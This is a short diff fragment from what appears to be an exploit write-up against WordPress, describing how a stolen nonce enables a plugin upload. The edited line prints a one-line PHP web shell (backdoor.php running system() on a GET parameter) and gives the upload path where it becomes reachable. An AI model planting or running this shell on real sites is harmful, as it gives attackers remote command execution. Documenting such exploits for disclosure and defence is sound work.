@@ -885,7 +885,7 @@ _wpnonce, so we have to get one of those to succeed in uploading a webshell. The
 1. steal nonce
 2. upload plugin, with nonce
 
-The following payload will upload backdoor.php containing &lt;?php echo system($_GET[\'cmd\']); ?&gt;
+The following payload will upload backdoor.php containing &lt;?php echo system($_GET['cmd']); ?&gt;
 which afterwards will be accessible in /wp-content/uploads/&lt;year&gt;/&lt;month&gt;/backdoor.php
 Video demonstration: https://www.youtube.com/watch?v=oifGQlO-PqI
 
